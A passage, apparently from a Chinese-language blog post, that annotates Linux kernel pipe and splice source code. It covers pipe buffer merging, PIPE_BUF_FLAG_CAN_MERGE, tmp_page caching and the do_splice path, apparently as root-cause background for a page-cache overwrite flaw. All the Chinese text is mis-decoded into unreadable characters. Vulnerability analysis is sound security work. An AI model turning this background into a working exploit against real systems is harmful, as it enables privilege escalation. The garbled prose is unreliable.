class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,</span></span><br><span class="hljs-params"><span class="hljs-function">             struct iov_iter *i)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// è·å–å¾…å†™å…¥çš„ pipe ç»“æ„ä½“</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>    <span class="hljs-comment">// è·å–å¾…å†™å…¥çš„ pipe ç»“æ„ä½“çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ headã€tailç­‰ç­‰ </span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_tail = pipe-&gt;tail;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i_head = i-&gt;head;<br>    <span class="hljs-keyword">size_t</span> off;<br><br>    <span class="hljs-comment">// è¿™é‡Œæ˜¯åœ¨åšä¸€äº› check</span><br>    <span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>        bytes = i-&gt;count;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!bytes))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!sanity(i))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>    <span class="hljs-comment">// è·å–å¾…å†™å…¥çš„ç›¸å¯¹åç§»ä½ç½®</span><br>    off = i-&gt;iov_offset;<br>    <span class="hljs-comment">// è·å–å¾…æ¥æ”¶æ•°æ®çš„ pipe buf</span><br>    buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>    <span class="hljs-keyword">if</span> (off) &#123;<br>        <span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br>            <span class="hljs-comment">/* merge with the last one */</span><br>            buf-&gt;len += bytes;<br>            i-&gt;iov_offset += bytes;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        i_head++;<br>        buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœå¾…å†™å…¥çš„ç®¡é“å·²æ»¡ï¼Œåˆ™ç›´æ¥è¿”å›</span><br>    <span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>    <span class="hljs-comment">// å¢åŠ è¯¥é¡µçš„ refcount</span><br>    get_page(page);<br>    buf-&gt;page = page;   <span class="hljs-comment">// ç›´æ¥å¼•ç”¨å·²æœ‰çš„é¡µ</span><br>    buf-&gt;offset = offset;<br>    buf-&gt;len = bytes;<br><br>    pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>    i-&gt;iov_offset = offset + bytes;<br>    i-&gt;head = i_head;<br>out:<br>    i-&gt;count -= bytes;<br>    <span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h4><p><a href="https://elixir.bootlin.com/linux/v5.8-rc1/source/fs/pipe.c">æºç </a> </p><p>pipe_writeç¬¬ä¸€æ®µ: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">head = pipe-&gt;head;<br>was_empty = pipe_empty(head, pipe-&gt;tail);<br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>    <span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>    <span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>        offset + chars &lt;= PAGE_SIZE) &#123;<br>        ret = pipe_buf_confirm(pipe, buf);<br>        <span class="hljs-keyword">if</span> (ret)<br>            <span class="hljs-keyword">goto</span> out;<br><br>        ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br>        <span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>            ret = -EFAULT;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        buf-&gt;len += ret;<br>        <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>            <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å‡½æ•°ç›®çš„æ˜¯ä»iterå¤åˆ¶åˆ°pipeçš„bufä¸­. </p><p>å¦‚æœè¯´å½“å‰ pipe buf ä¸­å·²ç»å­˜åœ¨æ•°æ®ï¼Œå¹¶ä¸”<br>iteræ€»é•¿åº¦ä¸æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ &amp;&amp; pipe bufçš„èµ·å§‹ä½ç½®+pipeå·²æœ‰æ•°æ®é•¿åº¦+iteræ€»é•¿åº¦modé¡µå¤§å° &lt; PAGE_SIZE,<br>é‚£ä¹ˆç›´æ¥å…ˆæŠŠiterå¼€å¤´ä¸€æ®µå¡«å……åˆ°pipe bufä¸­è¿›è¡Œæ•°æ®åˆå¹¶ã€‚</p><p>è¿™ä¸ªåˆå¹¶æ“ä½œéœ€è¦ pipe buf æœ‰ <strong>PIPE_BUF_FLAG_CAN_MERGE</strong> æ ‡å¿—ï¼Œè¯¥æ ‡å¿—åªè¦ pipe_write æ‰€å¯¹åº”çš„ fd æ²¡æœ‰è®¾ç½® O_DIRECT æ ‡å¿—å³å¯è‡ªåŠ¨è®¾ç½®ã€‚</p><p>å…¶æ¬¡æ˜¯æ­£å¸¸çš„é¡µé¢å†™å…¥é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-comment">// å¦‚æœä¸€ä¸ªç®¡é“æ²¡æœ‰è¯»è€…ï¼Œåˆ™è¯´æ˜ç®¡é“å·²ç»è¢«ç ´åï¼Œç”Ÿæˆ SIGPIPE ä¿¡å·</span><br>    <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>        send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -EPIPE;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// å°è¯•å¾ªç¯å¾€ç®¡é“å†…å†™å…¥æ•°æ®</span><br>    head = pipe-&gt;head;<br>    <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br>        <span class="hljs-keyword">int</span> copied;<br>        <span class="hljs-comment">// è·å–å…ˆå‰è¢«é‡Šæ”¾ä½†æ˜¯ç¼“å­˜èµ·æ¥çš„ tmp_pageã€‚</span><br>        <span class="hljs-comment">// å¦‚æœå­˜åœ¨ tmp_page åˆ™åœ¨å‘ pipe buf å†™å…¥æ•°æ®æ—¶å°±å¯ç›´æ¥é‡ç”¨è€Œæ— éœ€åˆ†é…</span><br>        <span class="hljs-keyword">if</span> (!page) &#123;<br>            page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br>            <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>                ret = ret ? : -ENOMEM;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            pipe-&gt;tmp_page = page;<br>        &#125;<br><br>        <span class="hljs-comment">/* Allocate a slot in the ring in advance and attach an</span><br><span class="hljs-comment">             * empty buffer.  If we fault or otherwise fail to use</span><br><span class="hljs-comment">             * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment">             * be there for the next write.</span><br><span class="hljs-comment">             */</span><br>        spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>        head = pipe-&gt;head;<br>        <span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>            spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>        spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>        <span class="hljs-comment">/* Insert it into the buffer array */</span><br>        <span class="hljs-comment">// å¾€æ–°çš„ pipe buf ä¸­å†™å…¥æ•°æ®</span><br>        buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>        buf-&gt;page = page;<br>        buf-&gt;ops = &amp;anon_pipe_buf_ops; <span class="hljs-comment">// è®¾ç½®åŒ¿åç®¡é“æ“ä½œ</span><br>        buf-&gt;offset = <span class="hljs-number">0</span>;<br>        buf-&gt;len = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// å¦‚æœ fd è®¾ç½®äº† O_DIRECTï¼Œåˆ™æ¯æ¬¡å†™å…¥æ—¶éƒ½ä¼šå ç”¨æ–°çš„ä¸€é¡µï¼Œè€Œä¸ä¼šåˆå¹¶</span><br>        <span class="hljs-keyword">if</span> (is_packetized(filp)) <br>            buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br>        <span class="hljs-keyword">else</span><br>            buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>        pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// å¤åˆ¶é¡µæ•°æ®</span><br>        copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br>        <span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br>            <span class="hljs-keyword">if</span> (!ret)<br>                ret = -EFAULT;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ret += copied;<br>        buf-&gt;offset = <span class="hljs-number">0</span>;<br>        buf-&gt;len = copied;<br><br>        <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br>        <span class="hljs-keyword">continue</span>;<br><br>    <span class="hljs-comment">/* Wait for buffer space to become available. */</span><br>    <span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -EAGAIN;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -ERESTARTSYS;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ª tmp_page ç®€å•è®²ä¸€ä¸‹ã€‚å¦‚æœè¯¥ pipe buf æ‰€æŒæœ‰çš„ page åªæœ‰å®ƒè‡ªå·±æŒæœ‰ï¼Œå¹¶ä¸”ç°åœ¨æ‰“ç®—å°†å…¶é‡Šæ”¾ï¼Œé‚£ä¹ˆ pipe buf å°±ç§ä¸‹ä¸é‡Šæ”¾è¯¥ pageï¼Œè€Œæ˜¯å°†å…¶ç¼“å­˜èµ·æ¥ä¾›åç»­ä½¿ç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">anon_pipe_buf_release</span><span class="hljs-params">(struct pipe_inode_info *pipe,</span></span><br><span class="hljs-params"><span class="hljs-function">                  struct pipe_buffer *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If nobody else uses this page, and we don&#x27;t already have a</span><br><span class="hljs-comment">     * temporary page, let&#x27;s keep track of it as a one-deep</span><br><span class="hljs-comment">     * allocation cache. (Otherwise just release our reference to it)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (page_count(page) == <span class="hljs-number">1</span> &amp;&amp; !pipe-&gt;tmp_page)<br>        pipe-&gt;tmp_page = page;<br>    <span class="hljs-keyword">else</span><br>        put_page(page);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä» pipe è¯»å†™æ“ä½œä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œpipe bufs å­˜æ”¾çš„é¡µé¢æ— éä¸¤ç§ï¼š</p><ol><li>ç›´æ¥å¼•ç”¨å…¶ä»–ä¸å˜é¡µï¼ˆä¾‹å¦‚æ–‡ä»¶ç¼“å­˜é¡µï¼‰ï¼Œè¿™æ ·å°±æ— éœ€è¿›è¡Œæ•°æ®å¤åˆ¶æ“ä½œ</li><li>è‡ªå·±åˆ›å»ºé¡µï¼Œéœ€è¦è¿›è¡Œæ•°æ®å¤åˆ¶</li></ol><p>ç”± pipe æœºåˆ¶æ¥ä¿è¯å­˜æ”¾åœ¨ pipe bufs ä¸­çš„é¡µæ•°æ®ï¼Œä¸ä¼šè¢« pipe æœ¬èº«ç»™è¦†å†™ã€‚åŒæ—¶æ³¨æ„åªæœ‰åœ¨è‡ªå·±åˆ›å»ºçš„é¡µä¸Šï¼Œæ‰èƒ½è¿›è¡Œ Merge æ“ä½œã€‚</p><p>è¿™æ˜¯å› ä¸ºpipeæœ¬æ„åªæ˜¯ä¸€ä¸ªæ¶ˆæ¯é€šé“, <strong>ä¸åº”å‡ºç°å¯¹å†…å­˜çš„é¢„æœŸå¤–ä¿®æ”¹</strong>, å³mergeæ“ä½œ. </p><h4 id="do-splice-å‡½æ•°"><a href="#do-splice-å‡½æ•°" class="headerlink" title="do_splice å‡½æ•°"></a>do_splice å‡½æ•°</h4><p>Linux åº“å‡½æ•° <code>splice</code> çš„ä½œç”¨æ˜¯ï¼Œå°†æŸä¸ª fd çš„æ•°æ®ä¸ç»è¿‡ç”¨æˆ·å±‚ï¼Œç›´æ¥æ‹·è´è¿›å¦ä¸€ä¸ª fd ä¸­ã€‚å…¶å‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE         <span class="hljs-comment">/* See feature_test_macros(7) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">splice</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd_in, <span class="hljs-keyword">loff_t</span> *off_in, <span class="hljs-keyword">int</span> fd_out, <span class="hljs-keyword">loff_t</span> *off_out, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œçš„ fd åªèƒ½æœ‰ä¸¤ç§æƒ…å†µï¼špipe fd æˆ– file fdï¼Œå› æ­¤åœ¨ do_splice å‡½æ•°ä¸­ï¼Œå†…æ ¸ä¹Ÿä¼šå¯¹ fd çš„ç±»å‹åšç‰¹åˆ¤ï¼Œæ¥æ‰§è¡Œä¸åŒçš„æ•°æ®ä¼ é€’æ“ä½œã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬åªéœ€å…³æ³¨ <strong>From-fd ä¸º fileï¼ŒTo-fd ä¸º pipe</strong> ï¼Œå³<strong>æ•°æ®ä»æ–‡ä»¶ä¼ é€’è‡³ç®¡é“</strong>çš„æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Determine where to splice to/from.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">do_splice</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> __user *off_in,</span></span><br><span class="hljs-params"><span class="hljs-function">        struct file *out, <span class="hljs-keyword">loff_t</span> __user *off_out,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br>    <span class="hljs-keyword">loff_t</span> offset;<br>    <span class="hljs-keyword">long</span> ret;<br><br>    ipipe = get_pipe_info(in);<br>    opipe = get_pipe_info(out);<br>    ...;<br>    <br>    <span class="hljs-comment">// å½“æ•°æ®ä»æ–‡ä»¶å¤åˆ¶ç»™ç®¡é“æ—¶</span><br>    <span class="hljs-keyword">if</span> (opipe) &#123;<br>        ...<br>        <span class="hljs-comment">// ç­‰å¾… pipe å­˜åœ¨ç©ºé—²ç©ºé—´</span><br>        <span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br>            flags |= SPLICE_F_NONBLOCK;<br><br>        pipe_lock(opipe);<br>        ret = wait_for_space(opipe, flags);<br>        <span class="hljs-comment">// å¦‚æœç­‰åˆ° pipe å­˜åœ¨ç©ºé—²ç©ºé—´å</span><br>        <span class="hljs-keyword">if</span> (!ret) &#123;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_space;<br>             <span class="hljs-comment">// è·å–å¾…ä¼ é€’æ•°æ®å¤§å°</span><br>            <span class="hljs-comment">/* Don&#x27;t try to read more the pipe has space for. */</span><br>            p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<br>            len = <span class="hljs-keyword">min_t</span>(<span class="hljs-keyword">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<br>            <span class="hljs-comment">// æ‰§è¡ŒçœŸæ­£çš„ä¼ é€’æ“ä½œ</span><br>            ret = do_splice_to(in, &amp;offset, opipe, len, flags);<br>        &#125;<br>        ...<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è€Œåœ¨ do_splice_to å‡½æ•°ä¸­ï¼Œå†…æ ¸ä¼šæ ¹æ®<strong>æ–‡ä»¶ç³»ç»Ÿç±»å‹</strong>ï¼Œæ¥è°ƒç”¨å¯¹åº”çš„ splice_read å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from a file to a pipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">do_splice_to</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> *ppos,</span></span><br><span class="hljs-params"><span class="hljs-function">             struct pipe_inode_info *pipe, <span class="hljs-keyword">size_t</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">             <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))<br>        <span class="hljs-keyword">return</span> -EBADF;<br><br>    ret = rw_verify_area(READ, in, ppos, len);<br>    <span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> ret;<br><br>    <span class="hljs-keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))<br>        len = MAX_RW_COUNT;<br>    <span class="hljs-comment">// è°ƒç”¨ splice_read å‡½æ•°</span><br>    <span class="hljs-keyword">if</span> (in-&gt;f_op-&gt;splice_read)<br>        <span class="hljs-keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<br>    <span class="hljs-keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ä»¥ linux ä¸­æœ€å¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿ ext4 ä¸ºä¾‹ï¼Œè¿™æ˜¯ ext4 æ–‡ä»¶ç³»ç»Ÿä¸­æ‰€è®¾ç½®çš„ä¸€äº›å…³é”®æ–¹æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// fs/ext4/file.c</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">ext4_file_operations</span> =</span> &#123;<br>    ...<br>    .read_iter    = ext4_file_read_iter,<br>    ...<br>    .splice_read  = generic_file_splice_read,<br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å› æ­¤æœ€ç»ˆ do_splice_to å‡½æ•°ä¼šè°ƒç”¨åˆ° generic_file_splice_read å‡½æ•°æ¥æ‰§è¡Œæ•°æ®ä¼ é€’ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 